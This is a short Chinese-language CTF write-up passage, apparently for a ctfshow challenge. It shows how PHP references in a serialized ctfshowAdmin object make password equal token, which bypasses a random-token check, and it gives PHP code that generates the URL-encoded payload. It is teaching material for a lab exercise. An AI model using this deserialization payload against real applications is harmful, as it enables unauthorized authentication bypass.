如果要靠输入的 `$password` 去和 `md5(mt_rand())` 碰撞，几乎是不可能的。这里需要用到 `php` 的[引用](https://www.php.net/manual/zh/language.references.php)，使得 `$password = &$token;`，那么 `$password === $token` 就没问题了。

```php
<?php

class ctfshowAdmin{
    public $token;
    public $password;
}

$c = new ctfshowAdmin();
$c->password = &$c->token;
var_dump(urlencode(serialize($c)));
```

